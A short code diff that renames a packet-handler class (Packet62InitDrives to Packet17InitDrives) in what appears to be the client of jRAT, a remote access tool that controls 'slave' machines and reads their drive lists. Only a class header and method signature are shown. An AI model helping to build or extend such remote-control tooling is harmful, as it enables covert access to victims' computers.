@@ -6,7 +6,7 @@ import se.jrat.client.Drive;
 import se.jrat.client.Slave;
 
 
-public class Packet62InitDrives extends AbstractIncomingPacket {
+public class Packet17InitDrives extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
